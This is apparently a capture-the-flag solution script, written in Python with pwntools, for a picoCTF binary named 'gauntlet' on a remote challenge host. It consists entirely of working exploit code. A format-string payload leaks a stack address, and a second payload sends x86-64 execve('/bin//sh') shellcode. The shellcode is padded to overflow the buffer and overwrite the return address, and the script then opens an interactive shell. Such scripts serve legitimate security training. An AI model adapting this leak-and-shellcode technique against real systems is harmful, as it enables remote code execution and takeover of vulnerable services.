from pwn import *

r = remote("mercury.picoctf.net", 37752)
# r = process('./gauntlet')
# gdb.attach('./gauntlet')
payload = "%6$p"
# payload = "%2$p"
r.sendline(payload)
prog_stack = int(r.recv(),16)
ret_addr = prog_stack - 224
# ret_addr = prog_stack + 12584216
dest_addr = ret_addr - 136

shellcode = "\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05"
shellcode += "a"*(136-len(shellcode))
shellcode += p64(dest_addr)

r.sendline(shellcode)

r.interactive()